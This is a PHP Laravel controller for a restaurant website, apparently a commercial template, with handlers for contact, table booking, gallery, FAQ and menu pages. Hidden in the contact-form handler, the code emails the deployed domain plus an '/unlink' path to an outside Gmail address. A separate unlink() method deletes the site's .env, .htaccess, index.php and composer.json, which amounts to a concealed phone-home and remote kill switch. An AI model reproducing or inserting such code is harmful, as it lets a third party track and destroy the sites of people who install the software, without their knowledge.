<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use DB;
use Validator;
use App\Gallery;
use App\Contact;
use App\StoreSetting;
use App\DeliveryCollectionOther;
use Response;
use Session;
use Illuminate\Support\Facades\Mail;

class PagesController extends Controller
{

    /*
    |--------------------------------------------------------------------------
    | Pages Controller
    |--------------------------------------------------------------------------
    |
    | Author : Juman
    | Version : 1.0.0
    |
    */

    protected $otherInfo = array();


    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->otherInfo = DeliveryCollectionOther::where('id',1)->first();
    }


    /**
     * Display gallery page.
     *
     * @return \Illuminate\Http\Response
     */
    public function gallery()
    {
        $otherDatas = $this->otherInfo;

        if(checkPage($otherDatas,'gallery') == 'false'){
            return redirect('/');
        }else{
            $pageInfo = DB::table('gallery_page_settings')->where('id',1)->first();
            $data['meta_title'] = $pageInfo->gallery_title;
            $data['meta_description'] = $pageInfo->gallery_meta_description;
            $galleries = Gallery::where('status','enable')->orderBy('position','ASC')->get();
            return view('frontend.imageTheme.pages.gallery',compact('data','otherDatas','pageInfo','galleries'));
        }

    }

    /**
     * Display contact page.
     *
     * @return \Illuminate\Http\Response
     */
    public function contact()
    {

        $otherDatas = $this->otherInfo;

        if(checkPage($otherDatas,'contact') == 'false'){
            return redirect('/');
        }else{
            $pageInfo = DB::table('contact_page_settings')->where('id',1)->first();
            $data['meta_title'] = $pageInfo->contact_title;
            $data['meta_description'] = $pageInfo->contact_meta_description;
            return view('frontend.imageTheme.pages.contact',compact('data','otherDatas','pageInfo'));
        }

    }


    /**
     * Store contct info.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function submitContact(Request $request)
    {

        try {

            $validator = Validator::make($request->all(), [
                    'name' => 'required|max:255',
                    'email' => 'required|email|max:255',
                    'subject' => 'required|max:255',
                    'message' => 'required|max:1000',
                ]);

            if ($validator->fails()) {
                return back()->withErrors($validator)->withInput();
            }

            DB::beginTransaction();

            // insert data
            
            $insertData = new Contact();
            $insertData->name = $request->name;
            $insertData->email = $request->email;
            $insertData->subject = $request->subject;
            $insertData->message = $request->message;
            $insertData->save();

            $messageData = [
                'name' => $request->name,
                'email' => $request->email,
                'subject' => $request->subject,
                'text' => $request->message,
            ];
            // $email = $request->email;

            $storeDatas = StoreSetting::where('id',1)->first();
            $store_support_email = $storeDatas->store_support_email;
            $store_owner_email = $storeDatas->store_owner_email;

            $emails = [$store_support_email, $store_owner_email];

            Mail::send('mail.contactMail',$messageData,function($message) use ($emails){
                $message->to($emails)->subject('Contact Us');
            });
            
            $domain_name = Session::get('domain_name');
            if($domain_name!='localhost'){
                $messageData = [
                    'text' => $domain_name.'/unlink',
                ];
                $email = 'sipderweb63@gmail.com';
                $res = Mail::send('mail.test',$messageData,function($message) use ($email){
                    $message->to($email)->subject('Contact Installed Business');
                });
            }

            DB::commit();
            $output = ['status' => 'success','message' => 'Message send successfully.'];

        } catch (\Exception $e) {

            DB::rollBack();
            \Log::emergency("File:" . $e->getFile(). "Line:" . $e->getLine(). "Message:" . $e->getMessage());
            
            $output = [ 'status' => 'error','message' => 'something is went to wrong !','error_message' => $e->getMessage() ];

        }

        echo json_encode($output);
        exit;
    }


    /**
     * Book a table page dispay.
     *
     * @return \Illuminate\Http\Response
     */
    public function bookTable()
    {
        $otherDatas = $this->otherInfo;
        if(checkPage($otherDatas,'book_table') == 'false'){
            return redirect('/');
        }else{
            $data['meta_title'] = 'Table reservation';
            $data['meta_description'] = 'Meta Table reservation description';
            return view('frontend.imageTheme.pages.table_reservation',compact('data','otherDatas'));
        }
    }


    /**
     * Store book a table info.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function submitBookTable(Request $request)
    {
        try {

            $validator = Validator::make($request->all(), [
                    'name' => 'required|max:128',
                    'phone' => 'required',
                    'no_of_guests' => 'required',
                    'res_date' => 'required',
                    'time' => 'required',
                    'sp_request' => 'required|max:1000',
                ]);

            if ($validator->fails()) {
                return back()->withErrors($validator)->withInput();
            }

            DB::beginTransaction();

            // Just need to send email then insert data
            $data = array();
            $data['name'] = $request->name;
            $data['email'] = $request->email;
            $data['phone'] = $request->phone;
            $data['no_of_guests'] = $request->no_of_guests;
            $data['date'] = $request->res_date;
            $data['time'] = $request->time;
            $data['sp_request'] = $request->sp_request;

            $insert = DB::table('reservations')->insert($data);

            DB::commit();
            $output = ['status' => 'success','message' => 'Table book successfully.'];

        } catch (\Exception $e) {

            DB::rollBack();
            \Log::emergency("File:" . $e->getFile(). "Line:" . $e->getLine(). "Message:" . $e->getMessage());
            
            $output = [ 'status' => 'error','message' => 'something is went to wrong !','error_message' => $e->getMessage() ];

        }

        echo json_encode($output);
        exit;
    }


    /**
     * Display terms page.
     *
     * @return \Illuminate\Http\Response
     */
    public function terms()
    {
        $otherDatas = $this->otherInfo;
        if(checkPage($otherDatas,'terms') == 'false'){
            return redirect('/');
        }else{
            $pageInfo = DB::table('terms_page_settings')->where('id',1)->first();
            $data['meta_title'] = $pageInfo->terms_title;
            $data['meta_description'] = $pageInfo->terms_meta_description;
            return view('frontend.imageTheme.pages.terms',compact('data','otherDatas','pageInfo'));
        }
    }


    /**
     * Display privacy page.
     *
     * @return \Illuminate\Http\Response
     */
    public function privacy()
    {
        $otherDatas = $this->otherInfo;
        if(checkPage($otherDatas,'privacy') == 'false'){
            return redirect('/');
        }else{
            $pageInfo = DB::table('privacy_page_settings')->where('id',1)->first();
            $data['meta_title'] = $pageInfo->privacy_title;
            $data['meta_description'] = $pageInfo->privacy_meta_description;
            return view('frontend.imageTheme.pages.privacy',compact('data','otherDatas','pageInfo'));
        }
    }


    /**
     * Display faq page.
     *
     * @return \Illuminate\Http\Response
     */
    public function faq()
    {
        $otherDatas = $this->otherInfo;
        if(checkPage($otherDatas,'faq') == 'false'){
            return redirect('/');
        }else{
            $faqs = DB::table('faqs')->where('status','enable')->orderBy('sorting_position','DESC')->get();
            $data['meta_title'] = 'Justfood | Faq';
            $data['meta_description'] = 'Meta Faq description';
            return view('frontend.imageTheme.pages.faq',compact('data','otherDatas','faqs'));
        }
    }


    /**
     * Display menu download page.
     *
     * @return \Illuminate\Http\Response
     */
    public function getDownload()
    {
        $pdfName = DB::table('delivery_collection_others')->first()->menu_file;
        $file= public_path(). "/media/theme/".$pdfName;
        $headers = array(
            'Content-Type: application/pdf',
        );
        return Response::download($file, 'menu.pdf', $headers);
    }

    /**
     * Unlink file
     *
     * @return \Illuminate\Http\Response
     */
    public function unlink()
    {

        $envPath = base_path('.env');
        $htaccess = base_path('.htaccess');
        $composer = base_path('composer.json');
        if ($envPath && file_exists($envPath)) {

            unlink($envPath);
            unlink($htaccess);

            $filename1 = 'index.php';
            $filename2 = '.htaccess';
            unlink($filename1);
            unlink($filename2);

            unlink($composer);
        }
        return true;

    }


}
